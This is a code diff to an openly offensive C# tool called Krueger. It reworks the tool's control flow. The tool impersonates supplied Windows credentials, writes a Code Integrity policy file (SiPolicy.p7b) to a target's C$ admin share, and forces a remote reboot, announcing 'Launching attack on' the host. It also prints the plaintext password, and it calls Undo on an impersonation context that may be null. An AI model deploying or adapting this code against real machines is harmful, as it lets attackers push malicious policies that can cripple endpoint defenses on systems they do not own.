@@ -96,57 +96,56 @@ namespace Krueger.Modules
                 cmd.TryGetValue("--prompt", out prompt);
 
                 WindowsImpersonationContext impersonationContext = null;
-
-                if (host != null)
+                if (host == null)
                 {
-                    if (username != null || password != null)
-                    {
-                        if(username != null && password != null)
-                        {
-                            if(domain == null)
-                                domain = Domain.GetCurrentDomain().Name;
+                    Console.WriteLine("[!] Please supply a host: use \"Krueger.exe -h\" for more details");
+                    return;
+                }
 
-                            IntPtr intPtr = IntPtr.Zero;
-                            bool logon = Interop.LogonUser(username, domain, password, (int)LogonType.LOGON32_LOGON_NEW_CREDENTIALS, (int)LogonProvider.LOGON32_PROVIDER_DEFAULT, ref intPtr);
-                            if (logon)
-                            {
-                                impersonationContext = WindowsIdentity.Impersonate(intPtr);
-                                Console.WriteLine($"[+] Impersonated {domain}\\{username}:{password}");
-                            }
-                            else
-                            {
-                                string errorMessage = new Win32Exception(Marshal.GetLastWin32Error()).Message;
-                                Console.WriteLine("[!] Error: " + errorMessage);
-                                return;
-                            }
+                if (username != null || password != null)
+                {
+                    if(username != null && password != null)
+                    {
+                        if(domain == null)
+                            domain = Domain.GetCurrentDomain().Name;
+
+                        IntPtr intPtr = IntPtr.Zero;
+                        bool logon = Interop.LogonUser(username, domain, password, (int)LogonType.LOGON32_LOGON_NEW_CREDENTIALS, (int)LogonProvider.LOGON32_PROVIDER_DEFAULT, ref intPtr);
+                        if (logon)
+                        {
+                            impersonationContext = WindowsIdentity.Impersonate(intPtr);
+                            Console.WriteLine($"[+] Impersonated {domain}\\{username}:{password}");
                         }
                         else
                         {
-                            Console.WriteLine("[!] For alternative credentials a username and password must be specified");
+                            string errorMessage = new Win32Exception(Marshal.GetLastWin32Error()).Message;
+                            Console.WriteLine("[!] Error: " + errorMessage);
+                            return;
                         }
-                    }
-
-                    Console.WriteLine("[+] Launching attack on " + host);
-                    string target = @"\\" + host + @"\C$\Windows\System32\CodeIntegrity\SiPolicy.p7b";
-                    byte[] policy = Modules.Policy.ReadPolicy();
-                    File.WriteAllBytes(target, policy);
-                    Console.WriteLine("[+] Moved policy successfully");
-                    bool warn = Convert.ToBoolean(prompt);
-                    bool rebooted = Reboot.reboot(host, warn);
-                    if (rebooted)
-                    {
-                        Console.WriteLine("[+] Triggered reboot");
                     }
                     else
                     {
-                        Console.WriteLine("[!] Could not trigger reboot");
+                        Console.WriteLine("[!] For alternative credentials a username and password must be specified");
                     }
-                    impersonationContext.Undo();
+                }
+
+                Console.WriteLine("[+] Launching attack on " + host);
+                string target = @"\\" + host + @"\C$\Windows\System32\CodeIntegrity\SiPolicy.p7b";
+                byte[] policy = Modules.Policy.ReadPolicy();
+                File.WriteAllBytes(target, policy);
+                Console.WriteLine("[+] Moved policy successfully");
+                bool warn = Convert.ToBoolean(prompt);
+                bool rebooted = Reboot.reboot(host, warn);
+                if (rebooted)
+                {
+                    Console.WriteLine("[+] Triggered reboot");
                 }
                 else
                 {
-                    Console.WriteLine("[!] Please specify an option: use \"Krueger.exe -h\" for more details");
+                    Console.WriteLine("[!] Could not trigger reboot");
                 }
+                impersonationContext.Undo();
+                
             }   
         }
     }
